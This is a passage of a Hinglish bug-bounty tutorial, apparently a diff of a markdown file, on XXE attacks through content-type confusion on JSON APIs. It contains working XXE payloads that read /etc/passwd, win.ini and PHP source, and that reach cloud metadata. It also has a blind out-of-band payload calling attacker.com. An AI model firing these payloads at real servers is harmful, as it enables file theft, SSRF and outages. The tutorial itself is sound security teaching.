+Is vulnerability ko exploit karke hum sensitive data le sakte hain, ya server ko kisi aur server par request bhejne ke liye use kar sakte hain (SSRF).
+
+## 🔍 5. Visual - Jab Screen Par Kya Dikhega
+
+Burp mein normal JSON request kuch aisi hoti hai:
+
+```
+POST /api/user HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"username":"admin"}
+```
+
+Agar tum Content-Type change karo aur XML bhejo:
+
+```
+POST /api/user HTTP/1.1
+Host: example.com
+Content-Type: application/xml
+
+<username>admin</username>
+```
+
+Aur server agar accept karta hai toh response aayega. Agar XXE payload try karo:
+
+```
+POST /api/user HTTP/1.1
+Host: example.com
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<username>&xxe;</username>
+```
+
+Response mein agar `/etc/passwd` ka content dikhe, toh vulnerability hai.
+
+## ⚙️ 6. Under the Hood (Technical Working)
+
+1. Server ko ek endpoint hai jo JSON expect karta hai.  
+2. Client XML bhejta hai, `Content-Type: application/xml` ke saath.  
+3. Server request aate hi content type check karta hai – agar multiple types support karta hai (JSON + XML), toh woh XML parser call kar deta hai.  
+4. XML parser DTD (Document Type Definition) parse karta hai. Agar external entities enabled hain, toh `<!ENTITY xxe SYSTEM "file:///etc/passwd">` ko process karte waqt server uss file ko read kar leta hai aur XML mein substitute kar deta hai.  
+5. Response mein file ka content aa jata hai.  
+
+## 💻 7. Hands-On: Step-by-Step Practical (Testing XXE via Content-Type Confusion)
+
+### Step 1: Identify endpoint
+- Koi bhi API endpoint dhoondo jo POST request accept karta ho, jaise login, profile update, etc.  
+- Burp proxy mein request capture karo.
+
+### Step 2: Check if XML accepted
+- Request ko Repeater mein bhejo.  
+- `Content-Type` header change karo `application/xml` (ya `text/xml`).  
+- Body mein simple XML daalo:  
+  ```xml
+  <root>test</root>
+  ```
+- Send karo. Agar response aata hai (not 415 Unsupported Media Type), toh XML supported hai.
+
+### Step 3: Test basic XXE
+- Ab body mein XXE payload daalo:  
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <root>&xxe;</root>
+  ```
+- Send karo. Agar response mein file content dikhe, toh critical bug.
+
+### Step 4: Try different paths
+- Agar `/etc/passwd` nahi khulta, toh try:  
+  - Windows: `file:///c:/windows/win.ini`  
+  - PHP wrapper: `php://filter/convert.base64-encode/resource=index.php`  
+  - Internal network: `http://169.254.169.254/latest/meta-data/` (cloud metadata)
+
+### Step 5: Blind XXE (out-of-band)
+- Agar response mein file nahi dikhta, toh blind XXE try karo.  
+- Payload:  
+  ```xml
+  <!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+  %xxe;
+  ]>
+  ```
+- Attacker server par log dekho – agar request aayi toh blind XXE hai.
+
+### Step 6: Swagger/OpenAPI discovery
+- Agar API documentation accessible ho (e.g., `/swagger.json`, `/api-docs`), toh wahan se endpoints ki list mil jayegi.  
+- In endpoints par bhi XML bhej ke test karo.
+
+## ⚖️ 8. Comparison (JSON vs XML)
+
+| Feature | JSON | XML |
+|---------|------|-----|
+| Syntax | Lightweight, key-value | Heavy, tags |
+| Parsing | Fast | Slow |
+| Security | No external entities | XXE vulnerabilities common |
+| Use case | Modern APIs | Legacy systems, SOAP |
+| Content-Type | `application/json` | `application/xml`, `text/xml` |
+
+## 🚫 9. Common Mistakes (Beginner Traps)
+
+- **Mistake 1:** Sirf JSON endpoints test karte hain, XML nahi.  
+  **Fix:** Har JSON endpoint par XML bhej ke dekho.  
+- **Mistake 2:** XXE payload mein syntax error.  
+  **Fix:** Validate XML syntax – proper closing tags, quotes.  
+- **Mistake 3:** File path galat likh dena.  
+  **Fix:** Operating system hisaab se path do (Linux: `/etc/passwd`, Windows: `c:\windows\win.ini`).  
+- **Mistake 4:** Blind XXE ke liye out-of-band server nahi rakhte.  
+  **Fix:** Burp Collaborator ya apna VPS use karo.
+
+## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
+
+- **"Log sochte hain ki XXE sirf XML parsers mein hota hai."**  
+  **Actually:** XXE specifically un XML parsers mein hota hai jinhone external entities enable rakhi hain. By default kuch libraries disabled rakhti hain, but many still vulnerable.  
+- **"Log sochte hain ki Content-Type change karna enough hai."**  
+  **Actually:** Agar server sirf JSON support karta hai, toh XML bhejne par 415 error aayega. Lekin kai servers accept karte hain – especially REST APIs jo legacy clients ko support karte hain.
+
+## 🌍 11. Real-World Use Case (Bug Bounty)
+
+**Scenario:** Ek large tech company ka API tha jo JSON expect karta tha. Researcher ne content-type XML change kiya, server ne accept kar liya. XXE payload bhej kar `/etc/passwd` read kar liya.  
+**Result:** Critical severity, $10,000 bounty.
+
+## 🎨 12. Visual Diagram (ASCII Art)
+
+```
+[Attacker] -- XML with XXE --> [Vulnerable Server]
+[Server] reads file:///etc/passwd
+[Server] -- Response with file content --> [Attacker]
+```
+
+## 🛠️ 13. Best Practices (Pro Tips)
+
+- **Tip 1:** Har JSON endpoint par XML bhej ke test karo.  
+- **Tip 2:** Agar XML accepted ho, toh XXE ke alawa bhi attacks try karo – XInclude, DoS (billion laughs).  
+- **Tip 3:** Blind XXE ke liye Burp Collaborator use karo – external interaction detect karne ke liye.  
+- **Tip 4:** Swagger/OpenAPI endpoints bhi check karo – wahan documented parameters ke saath XML try karo.
+
+## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?)
+
+- **Scenario 1:** XXE vulnerable reh gaya toh attacker sensitive files read kar sakta hai – passwords, source code.  
+- **Scenario 2:** SSRF ke through internal network scan kar sakta hai.  
+- **Scenario 3:** Billion laughs attack se server crash kar sakta hai (DoS).
+
+## ❓ 15. FAQ (Interview Questions)
+
+**Q1: XXE attack kya hai?**  
+A1: XML External Entity attack, jisme attacker external entity define karta hai jo server par file read kar leta hai ya request bhejta hai.  
+
+**Q2: Content-Type confusion kaise hota hai?**  
+A2: Jab server multiple content types support karta hai, aur attacker ek aisa type bhejta hai jo vulnerable parser use karta ho.  
+
+**Q3: XXE se kya kya ho sakta hai?**  
+A3: File read, SSRF, DoS, port scanning.  
+
+**Q4: Blind XXE kya hota hai?**  
+A4: Jab response mein file content nahi aata, but attacker out-of-band channel se data nikaal sakta hai.  
+
+**Q5: XXE se bachne ke liye kya karna chahiye?**  
+A5: Disable external entities in XML parser, use JSON instead.  
+
+## 📝 16. Ek Line Mein Yaad Rakhne Ko (Summary)
+
+**Content-Type confusion + XXE = JSON API ko XML bhej kar server ki files churana – jaise dabba bhej kar patra khulwana aur andar ki recipe padh lena.**
+
+---
+
+========================================================================================
